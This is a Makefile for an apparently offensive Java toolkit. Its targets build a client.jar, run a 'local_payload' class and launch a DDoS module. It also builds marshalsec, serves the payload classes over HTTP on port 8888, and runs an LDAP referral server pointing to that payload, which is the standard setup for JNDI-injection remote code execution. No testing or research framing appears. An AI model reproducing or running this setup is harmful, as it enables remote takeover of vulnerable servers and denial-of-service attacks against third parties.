JFLAGS = --release 8 -verbose
JC = javac

.SUFFIXES: .java .class
.java.class:
	@printf "JAVAC\t $*.java\n"
	@$(JC) $(JFLAGS) $*.java

rwildcard=$(foreach d,$(wildcard $(1:=/*)),$(call rwildcard,$d,$2) $(filter $(subst *,%,$2),$d))

CLASSES = $(call rwildcard,./,*.java)

default: classes

classes: $(CLASSES:.java=.class)
	@make .classes

.classes:
	@printf "GEN\t .classes\n"
	@echo '$(call rwildcard,./,*.class)' > .classes

jar: classes
	@printf "JAR\t .classes\n"
	@jar cf client.jar `cat .classes`

run: jar
	@printf "JAVA\t local_payload\n";
	@java local_payload;

run_ddos: jar
	@printf "JAVA\t gq.glowman554.modules.impl.ddos.DDOSer\n";
	@java gq.glowman554.modules.impl.ddos.DDOSer;
/bin/marshalsec.jar:
	git clone https://github.com/mbechler/marshalsec.git
	cd marshalsec; mvn package -Dmaven.test.skip=true; sudo cp target/marshalsec-0.0.3-SNAPSHOT-all.jar /bin/marshalsec.jar; cd ..
	rm marshalsec -rf

serve_http: jar
	@printf "HTTP\t 8888\n";
	@python3 -m http.server 8888

ldap_refer: /bin/marshalsec.jar jar
	@printf "LDPA\t 1389\n";
	@java -cp /bin/marshalsec.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#payload"

clean: classes
	@$(RM) `cat .classes` .classes client.jar -r